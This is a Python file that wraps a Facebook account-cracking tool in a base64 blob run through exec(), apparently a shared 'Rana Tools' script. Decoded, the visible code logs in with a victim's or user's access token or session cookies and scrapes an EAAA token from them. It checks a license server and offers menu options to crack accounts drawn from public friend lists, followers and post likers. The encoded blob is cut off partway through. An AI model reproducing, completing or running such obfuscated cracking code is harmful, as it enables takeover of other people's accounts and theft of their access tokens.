#!/usr/bin/python3
#coding=utf-8
#Coding By Rana Nadeem Rajput
import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24NCiMgLSotIGNvZGluZzogdXRmLTgNCiNDb2RpbmcgQnkgUmFuYSBOYWRlZW0gUmFqcHV0DQppbXBvcnQgcmVxdWVzdHMsYnM0LHN5cyxvcyxyYW5kb20sdGltZSxyZSxqc29uLHV1aWQsc3VicHJvY2Vzcw0KZnJvbSByYW5kb20gaW1wb3J0IHJhbmRpbnQNCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgcGFyDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KZnJvbSB1cmxsaWIucGFyc2UgaW1wb3J0IHF1b3RlDQpQID0gIlx4MWJbMDs5N20iICMgUHV0aWgNCk0gPSAiXHgxYlswOzkxbSIgIyBNZXJhaA0KSCA9ICJceDFiWzA7OTJtIiAjIEhpamF1DQpLID0gIlx4MWJbMDs5M20iICMgS3VuaW5nDQpCID0gIlx4MWJbMDs5NG0iICMgQmlydQ0KVSA9ICJceDFiWzA7OTVtIiAjIFVuZ3UNCk8gPSAiXHgxYlswOzk2bSIgIyBCaXJ1IE11ZGENCk4gPSAiXDAzM1swbSIgICAgIyBXYXJuYSBNYXRpDQp1cmxfbGljZW5zZSA9ICdodHRwczovL25nZXBldG9ubGluZS4wMDB3ZWJob3N0YXBwLmNvbS9jaGVrLnBocD9wcm9qZWN0PXRlc3RsaWNlbmNlJmFwaWtleT0nDQpob3N0ID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSINCm9rID0gW10NCmNwID0gW10NCnR0bCA9IFtdDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCmJ1bGFuX3R0bCA9IHsiMDEiOiAiSmFudWFyeSIsICIwMiI6ICJGZWJydWFyeSIsICIwMyI6ICJNYXJjaCIsICIwNCI6ICJBcHJpbCIsICIwNSI6ICJNYXkiLCAiMDYiOiAiSnVuZSIsICIwNyI6ICJKdWx5IiwgIjA4IjogIkF1Z3VzdCIsICIwOSI6ICJTZXB0ZW1iZXIiLCAiMTAiOiAiT2N0b2JlciIsICIxMSI6ICJOb3ZlbWJlciIsICIxMiI6ICJEZWNlbWJlciJ9DQpidWxhbiA9IFsiSmFudWFyeSIsICJGZWJydWFyeSIsICJNYXJjaCIsICJBcHJpbCIsICJNYXkiLCAiSnVuZSIsICJKdWx5IiwgIkF1Z3VzdCIsICJTZXB0ZW1iZXIiLCAiT2N0b2JlciIsICJOb3ZlbWJlciIsICJEZWNlbWJlciJdDQp0cnk6DQogICAgaWYgYnUgPCAwIG9yIGJ1ID4gMTI6DQogICAgICAgIGV4aXQoKQ0KICAgIGJ1VGVtcCA9IGJ1IC0gMQ0KZXhjZXB0IFZhbHVlRXJyb3I6DQogICAgZXhpdCgpDQpvcCA9IGJ1bGFuW2J1VGVtcF0NCnRhbmdnYWwgPSAoIiVzLSVzLSVzIiUoaGEsb3AsdGEpKQ0KdWFfeGlhb21pICA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQp1YV9ub2tpYSAgID0gJ25va2lhYzMtMDAvNS4wICgwNy4yMCkgcHJvZmlsZS9taWRwLTIuMSBjb25maWd1cmF0aW9uL2NsZGMtMS4xIG1vemlsbGEvNS4wIGFwcGxld2Via2l0LzQyMCsgKGtodG1sLCBsaWtlIGdlY2tvKSBzYWZhcmkvNDIwKycNCnVhX2FzdXMgICAgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQp1YV9odWF3ZWkgID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgSFVBV0VJIFk3IFBSSU1FIDIwMTkgQnVpbGQvNTg4NzIwOCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny42MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQp1YV92aXZvICAgID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgdml2byAxOTE4KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTMuMC40NTc3LjYyIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCnVhX29wcG8gICAgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMS4xOyBBMzdmKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODkuMC40Mzg5LjEwNSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQp1YV9zYW1zdW5nID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjA7IFNNLUc5MDBQIEJ1aWxkL0xSWDIxVDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS80My4wLjIzNTcuMTIxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzM1LjAuMC40OC4yNzM7XScNCnVhX3dpbmRvd3MgPSAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85My4wLjQ1NzcuNjMgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQpkZWYgamFsYW4oeik6DQogICAgZm9yIGUgaW4geiArICJcbiI6DQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRpbWUuc2xlZXAoMC4wNCkNCmRlZiBtbGFrdSh6KToNCiAgICBmb3IgZSBpbiB6ICsgIlxuIjoNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgdGltZS5zbGVlcCgwLjAzKQ0KZGVmIGNsZWFyKCk6DQogICAgaWYgImxpbnV4IiBpbiBzeXMucGxhdGZvcm0ubG93ZXIoKTpvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBlbGlmICJ3aW4iIGluIHN5cy5wbGF0Zm9ybS5sb3dlcigpOm9zLnN5c3RlbSgiY2xzIikNCiAgICBlbHNlOm9zLnN5c3RlbSgiY2xlYXIiKQ0KZGVmIGJhbm5lcigpOg0KICAgIHByaW50KCJcblx4MWJbMDszN20lc1wwMzNbMDs5Mm18IF9fXyBcICBcbiVzfCB8Xy8gL19fIF8gXyBfXyAgIF9fIF8gICVzQ29kZWQgQnkgJXNSYW5hIE5hZGVlbSAlcy0gJXNSYWpwdXRcbiVzfCAgICAvLyBfYCB8ICdfIFwgLyBfYCB8ICVzRkIgJXM6ICVzRmFjZWJvb2suY29tL0lUWFJBTkEuNTIyNFxuJXN8IHxcIFwgKF98IHwgfCB8IHwgKF98IHwgJXNGQiAlczogJXNGYWNlYm9vay5jb20vSVRYUkFOQS41MjE0XG4lc1xffCBcX1xfXyxffF98IHxffFxfXyxffCAlc0dpdGh1YiAlczogJXNHaXRodWIuY29tL1JhbmFuYWRlZW01MjE0XG4iJShPLE8sUCxPLFAsTyxPLFAsTyxQLE8sUCxPLFAsTyxQLE8sUCkpDQpkZWYgbWVudV9sb2coKToNCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiB0b2tlbi50eHQnKQ0KICAgIGNsZWFyKCkNCiAgICBiYW5uZXIoKQ0KICAgIHZhcl9tZW51KCkNCiAgICBwbXUgPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNDaG9vc2UgOiAnJShPLFAsTyxQKSkNCiAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICBpZiBwbXUgaW4gWycnXToNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQogICAgICAgIG1lbnVfbG9nKCkNCiAgICBlbGlmIHBtdSBpbiBbJzEnLCcwMScsJzAwMScsJ2EnXToNCiAgICAgICAgZGVmYXVsdHVhKCkNCiAgICAgICAgdG9rZW4gPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNUb2tlbiA6ICclKE8sUCxPLFApKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICB4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQ0KICAgICAgICAgICAgeSA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KICAgICAgICAgICAgbiA9IHlbJ25hbWUnXQ0KICAgICAgICAgICAgeGQgPSBvcGVuKCJ0b2tlbi50eHQiLCAidyIpDQogICAgICAgICAgICB4ZC53cml0ZSh0b2tlbikNCiAgICAgICAgICAgIHhkLmNsb3NlKCkNCiAgICAgICAgICAgIHByaW50KCclc+KdpeKUgSclKE8pKQ0KICAgICAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0xvZ2luIFN1Y2Nlc3NmdWwgaW4gUmFuYSBUb29scyclKE8sUCxPLFApKQ0KICAgICAgICAgICAgbWVudSgpDQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQogICAgICAgICAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICAgICAgICAgIGphbGFuKCclc+KdpeKUgVslcyElc10gJXNUb2tlbiBJbnZhbGlkJyUoTSxQLE0sUCkpDQogICAgICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiB0b2tlbi50eHQnKQ0KICAgICAgICAgICAgbWVudV9sb2coKQ0KICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgICAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICAgICAgICAgIGphbGFuKCclc+KdpeKUgVslcyElc10gJXNDb25uZWN0aW9uIFByb2JsZW0nJShNLFAsTSxQKSkNCiAgICAgICAgICAgIGV4aXQoKQ0KICAgIGVsaWYgcG11IGluIFsnMicsJzAyJywnMDAyJywnYiddOg0KICAgICAgICBkZWZhdWx0dWEoKQ0KICAgICAgICBjb29raWUgPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNDb29raWVzIDogJyUoTyxQLE8sUCkpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGRhdGEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vY29tcG9zZXIvb2NlbG90L2FzeW5jX2xvYWRlci8/cHVibGlzaGVyPWZlZWQjXz1fIiwgaGVhZGVycyA9IHsNCiAgICAgICAgICAgICJ1c2VyLWFnZW50IiAgICAgICAgICAgICAgICA6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4xLjA7IE1JIDggQnVpbGQvT1BNMS4xNzEwMTkuMDExKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjkuMC4zNDk3Ljg2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwgIyBKYW5nYW4gRGkgR2FudGkgRWEgQW5qaW5rLg0KICAgICAgICAgICAgInJlZmVyZXIiICAgICAgICAgICAgICAgICAgIDogImh0dHBzOi8vbS5mYWNlYm9vay5jb20vIiwNCiAgICAgICAgICAgICJob3N0IiAgICAgICAgICAgICAgICAgICAgICA6ICJtLmZhY2Vib29rLmNvbSIsDQogICAgICAgICAgICAib3JpZ2luIiAgICAgICAgICAgICAgICAgICAgOiAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSIsDQogICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyIgOiAiMSIsDQogICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIiAgICAgICAgICAgOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciLA0KICAgICAgICAgICAgImNhY2hlLWNvbnRyb2wiICAgICAgICAgICAgIDogIm1heC1hZ2U9MCIsDQogICAgICAgICAgICAiYWNjZXB0IiAgICAgICAgICAgICAgICAgICAgOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCIsDQogICAgICAgICAgICAiY29udGVudC10eXBlIiAgICAgICAgICAgICAgOiAidGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ig0KICAgICAgICAgICAgfSwgY29va2llcyA9IHsNCiAgICAgICAgICAgICJjb29raWUiICAgICAgICAgICAgICAgICAgICA6IGNvb2tpZQ0KICAgICAgICAgICAgfSkNCiAgICAgICAgICAgIGZpbmRfdG9rZW4gPSByZS5zZWFyY2goIihFQUFBXHcrKSIsIGRhdGEudGV4dCkNCiAgICAgICAgICAgIGhhc2lsID0gIlxuKiBGYWlsIDogbWF5YmUgeW91ciBjb29raWUgaW52YWxpZCAhISIgaWYgKGZpbmRfdG9rZW4gaXMgTm9uZSkgZWxzZSAiXG4qIFlvdXIgZmIgYWNjZXNzIHRva2VuIDogIiArIGZpbmRfdG9rZW4uZ3JvdXAoMSkNCiAgICAgICAgICAgIHhkID0gb3BlbigidG9rZW4udHh0IiwgInciKQ0KICAgICAgICAgICAgeGQud3JpdGUoZmluZF90b2tlbi5ncm91cCgxKSkNCiAgICAgICAgICAgIHhkLmNsb3NlKCkNCiAgICAgICAgICAgIHByaW50KCclc+KdpeKUgSclKE8pKQ0KICAgICAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0xvZ2luIFN1Y2Nlc3NmdWwgaW4gUmFuYSBUb29scyclKE8sUCxPLFApKQ0KICAgICAgICAgICAgbWVudSgpDQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCiAgICAgICAgICAgIHByaW50KCclc+KdpeKUgSclKE8pKQ0KICAgICAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0Nvbm5lY3Rpb24gUHJvYmxlbSclKE0sUCxNLFApKQ0KICAgICAgICAgICAgZXhpdCgpDQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcixBdHRyaWJ1dGVFcnJvcik6DQogICAgICAgICAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICAgICAgICAgIGphbGFuKCclc+KdpeKUgVslcyElc10gJXNDb29raWVzIEludmFsaWQnJShNLFAsTSxQKSkNCiAgICAgICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIHRva2VuLnR4dCcpDQogICAgICAgICAgICBtZW51X2xvZygpDQogICAgZWxpZiBwbXUgaW4gWyczJywnMDMnLCcwMDMnLCdjJ106DQogICAgICAgIGNsZWFyKCkNCiAgICAgICAgYmFubmVyKCkNCiAgICAgICAgdmFyX3R1dG9yKCkNCiAgICAgICAgcGYgPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNDaG9vc2UgOiAnJShPLFAsTyxQKSkNCiAgICAgICAgcHJpbnQoJyVz4p2l4pSBJyUoTykpDQogICAgICAgIGlmIHBmIGluIFsnJ106DQogICAgICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgIG1lbnVfbG9nKCkNCiAgICAgICAgZWxpZiBwZiBpbiBbJzEnLCcwMScsJzAwMScsJ2EnXToNCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9mYWNlYm9vay5jb20vSVRYUkFOQS41MjE0JykNCiAgICAgICAgICAgIGlucHV0KCclc+KdpeKUgVsgJXNSZXR1cm4gJXNdJXMnJShPLFAsTyxQKSkNCiAgICAgICAgICAgIG1lbnVfbG9nKCkNCiAgICAgICAgZWxpZiBwZiBpbiBbJzInLCcwMicsJzAwMicsJ2InXToNCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9mYWNlYm9vay5jb20vSVRYUkFOQS41MjE0JykNCiAgICAgICAgICAgIGlucHV0KCclc+KdpeKUgVsgJXNSZXR1cm4gJXNdJXMnJShPLFAsTyxQKSkNCiAgICAgICAgICAgIG1lbnVfbG9nKCkNCiAgICAgICAgZWxpZiBwZiBpbiBbJzMnLCcwMycsJzAwMycsJ2MnXToNCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9mYWNlYm9vay5jb20vSVRYUkFOQS41MjE0JykNCiAgICAgICAgICAgIHR1dG9yX3RhcmdldCgpDQogICAgICAgICAgICBpbnB1dCgnJXPinaXilIFbICVzUmV0dXJuICVzXSVzJyUoTyxQLE8sUCkpDQogICAgICAgICAgICBtZW51X2xvZygpDQogICAgICAgIGVsaWYgcGYgaW4gWyc0JywnMDQnLCcwMDQnLCdkJ106DQogICAgICAgICAgICB0dXRvcl9jcmFjaygpDQogICAgICAgICAgICBpbnB1dCgnJXPinaXilIFbICVzUmV0dXJuICVzXSVzJyUoTyxQLE8sUCkpDQogICAgICAgICAgICBtZW51X2xvZygpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgIG1lbnVfbG9nKCkNCiAgICBlbGlmIHBtdSBpbiBbJzQnLCcwNCcsJzAwNCcsJ2QnXToNCiAgICAgICAgY2xlYXIoKQ0KICAgICAgICBiYW5uZXIoKQ0KICAgICAgICB2YXJfYXV0aG9yKCkNCiAgICAgICAgaW5wdXQoJyVz4p2l4pSBWyAlc1JldHVybiAlc10lcyclKE8sUCxPLFApKQ0KICAgICAgICBtZW51X2xvZygpDQogICAgZWxpZiBwbXUgaW4gWycwJywnMDAnLCcwMDAnLCdlJ106DQogICAgICAgIGphbGFuKCclc+KdpeKUgVslcyElc10gJXNUaGFuayBZb3UgRm9yIFVzaW5nIFRoaXMgU0MnJShPLFAsTyxQKSkNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0hhdmUgYSBOaWNlIERheSA6KVxuJyUoTyxQLE8sUCkpDQogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIHRva2VuLnR4dCcpDQogICAgICAgIGNsZWFyKCkNCiAgICAgICAgZXhpdCgpDQogICAgZWxzZToNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQogICAgICAgIG1lbnVfbG9nKCkNCmRlZiBtZW51KCk6DQogICAgY2xlYXIoKQ0KICAgIGJhbm5lcigpDQogICAgdHJ5Og0KICAgICAgICBsaXNlbnNpID0gb3BlbigibGljZW5zZS50eHQiLCJyIikucmVhZCgpDQogICAgICAgIHdsID0gcmVxdWVzdHMuZ2V0KHVybF9saWNlbnNlICsgbGlzZW5zaSkNCiAgICAgICAgd2sgPSBqc29uLmxvYWRzKHdsLnRleHQpDQogICAgICAgIGt1biA9IGxpc2Vuc2kuc3BsaXQoJy0nKQ0KICAgICAgICB1c2VycyA9IHdrWyd1c2VybmFtZSddDQogICAgICAgIG1haWxlcnRzID0gd2tbJ2VtYWlsJ10uc3BsaXQoJ0AnKQ0KICAgICAgICBtYWlsZXJ0MSA9IG1haWxlcnRzWzBdDQogICAgICAgIG1haWxlcnQyID0gbWFpbGVydHNbMV0NCiAgICAgICAgbWFpbGVyID0gbWFpbGVydDFbOjJdDQogICAgICAgIG1haWxlID0gKG1haWxlcisneHh4eHhAJyttYWlsZXJ0MikNCiAgICAgICAgYmVyZ2FidW5nID0gd2tbJ2pvaW5lZCddDQogICAgICAgIGthZGFsdWFyc2EgPSB3a1snZXhwaXJlZCddDQogICAgICAgIHN0YXR1cyA9ICgnJXNQcmVtaXVtIFslc1BybyVzXSclKE8sUCxPKSkNCiAgICAgICAga3VuY2kgPSAoJyVzJXMlcy0lcyVzJXMtJXNYWFhYWCclKE8sa3VuWzBdLFAsTyxrdW5bMV0sUCxPKSkNCiAgICAgICAgcHJvID0gJycNCiAgICAgICAgdXBncmFkZSA9ICdHYW50aSBMaWNlbnNlIEtleScNCiAgICAgICAgamlkID0gJycNCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KICAgICAgICBzdGF0dXMgPSAnUGVuZ2d1bmEgR3JhdGlzJw0KICAgICAgICB1c2VycyA9ICctJw0KICAgICAgICBtYWlsZSA9ICctJw0KICAgICAgICBrdW5jaSA9ICctJw0KICAgICAgICBiZXJnYWJ1bmcgPSAnLScNCiAgICAgICAga2FkYWx1YXJzYSA9ICctJw0KICAgICAgICBwcm8gPSAoIiVzWyVzUHJvJXNdIiUoTyxQLE8pKQ0KICAgICAgICB1cGdyYWRlID0gKCdVcGdyYWRlIFRvIFZlcnNpb24gJXNQcm8nJShPKSkNCiAgICAgICAgamlkID0gKCclc1slczUwMDAgSUQlc10nJShPLFAsTykpDQogICAgdHJ5Og0KICAgICAgICB0b2tlbiA9IG9wZW4oInRva2VuLnR4dCIsInIiKS5yZWFkKCkNCiAgICAgICAgeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSIgKyB0b2tlbikNCiAgICAgICAgeSA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KICAgICAgICBuID0geVsnbmFtZSddDQogICAgICAgIGkgPSB5WydpZCddDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCiAgICAgICAgcHJpbnQoJyVz4p2l4pSBWyAlc09oICVzXSVzJyUoTSxQLE0sUCkpDQogICAgICAgIHByaW50KCclc+KdpeKUgSclKE0pKQ0KICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzVG9rZW4vQ29va2llcyBJbnZhbGlkJyUoTSxQLE0sUCkpDQogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIHRva2VuLnR4dCcpDQogICAgICAgIG1lbnVfbG9nKCkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgIHByaW50KCclc+KdpeKUgVsgJXNPaCAlc10lcyclKE0sUCxNLFApKQ0KICAgICAgICBwcmludCgnJXPinaXilIEnJShNKSkNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0Nvbm5lY3Rpb24gUHJvYmxlbSclKE0sUCxNLFApKQ0KICAgICAgICBleGl0KCkNCiAgICBhID0gcmVxdWVzdHMuZ2V0KCJodHRwOi8vaXAtYXBpLmNvbS9qc29uLyIsaGVhZGVycz17IlJlZmVyZXIiOiJodHRwOi8vaXAtYXBpLmNvbS8iLCJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04IiwiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIn0pLmpzb24oKQ0KICAgIHRyeToNCiAgICAgICAgaXAgPSBhWyJxdWVyeSJdDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBpcCA9ICIgIg0KICAgIHByaW50KCclc+KdpeKUgVsgJXNXZWxsY29tZSAlcyAlc10nJShPLFAsbixPKSkNCiAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICBwcmludCgnJXPinaXilIFbJXPigKIlc10gJXNJRCA6ICVzJyUoTyxQLE8sUCxpKSkNCiAgICBwcmludCgnJXPinaXilIFbJXPigKIlc10gJXNJUCA6ICVzJyUoTyxQLE8sUCxpcCkpDQogICAgcHJpbnQoJyVz4p2l4pSBJyUoTykpDQogICAgcHJpbnQoJyVz4p2l4pSBJyUoTykpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzMSVzXSAlc0NyYWNrIEZyb20gUHVibGljICVzJyUoTyxQLE8sUCxqaWQpKQ0KICAgIHByaW50KCclc+KdpeKUgVslczIlc10gJXNDcmFjayBGcm9tIEZvbGxvd2VyICVzJyUoTyxQLE8sUCxqaWQpKQ0KICAgIHByaW50KCclc+KdpeKUgVslczMlc10gJXNDcmFjayBGcm9tIGxpa2VzIHBvc3QgJXMnJShPLFAsTyxQLGppZCkpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzNCVzXSAlc1JldHJpZXZlIFRhcmdldCBEYXRhJyUoTyxQLE8sUCkpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzNSVzXSAlc1Rha2luZyBOdW1iZXIgb2YgRnJpZW5kcyAlcyclKE8sUCxPLFAscHJvKSkNCiAgICBwcmludCgnJXPinaXilIFbJXM2JXNdICVzQ2hlY2sgQ3JhY2sgUmVzdWx0cyclKE8sUCxPLFApKQ0KICAgIHByaW50KCclc+KdpeKUgVslczclc10gJXNDaGVjayBDcmFjayBSZXN1bHQgT3B0aW9ucyAlcyclKE8sUCxPLFAscHJvKSkNCiAgICBwcmludCgnJXPinaXilIFbJXM4JXNdICVzVXNlciBBZ2VudCclKE8sUCxPLFApKQ0KICAjICBwcmludCgnJXPilaDilZDilZBbJXM5JXNdICVzJXMnJShPLFAsTyxQLHVwZ3JhZGUpKQ0KICAgIHByaW50KCclc+KdpeKUgVslczAlc10gJXNMb2cgT3V0JyUoTyxQLE8sUCkpDQogICAgcG0gPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNDaG9vc2UgOiAnJShPLFAsTyxQKSkNCiAgICBwcmludCgnJXPilZEnJShPKSkNCiAgICBpZiBwbSBpbiBbJyddOg0KICAgICAgICBqYWxhbignJXPilZrilZDilZBbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgbWVudSgpDQogICAgZWxpZiBwbSBpbiBbJzEnLCcwMScsJzAwMScsJ2EnXToNCiAgICAgICAgcHVibGlrKCkNCiAgICBlbGlmIHBtIGluIFsnMicsJzAyJywnMDAyJywnYiddOg0KICAgICAgICBwZW5naWt1dCgpDQogICAgZWxpZiBwbSBpbiBbJzMnLCcwMycsJzAwMycsJ2MnXToNCiAgICAgICAgbGlrZXJzKCkNCiAgICBlbGlmIHBtIGluIFsnNCcsJzA0JywnMDA0JywnZCddOg0KICAgICAgICB0YXJnZXQoKQ0KICAgIGVsaWYgcG0gaW4gWyc1JywnMDUnLCcwMDUnLCdlJ106DQogICAgICAgIHRlbWFuX3RhcmdldCgpDQogICAgZWxpZiBwbSBpbiBbJzYnLCcwNicsJzAwNicsJ2YnXToNCiAgICAgICAgaGFzaWwoKQ0KICAgIGVsaWYgcG0gaW4gWyc3JywnMDcnLCcwMDcnLCdnJ106DQogICAgICAgIGNla19oYXNpbCgpDQogICAgZWxpZiBwbSBpbiBbJzgnLCcwOCcsJzAwOCcsJ2gnXToNCiAgICAgICAgdWdlbigpDQogIyAgIGVsaWYgcG0gaW4gWyc5JywnMDknLCcwMDknLCdpJ106DQogICAgICAgIGJ1eV9saWNlbnNlKCkNCiAgICBlbGlmIHBtIGluIFsnMCcsJzAwJywnMDAwJywnaiddOg0KICAgICAgICBqYWxhbignJXP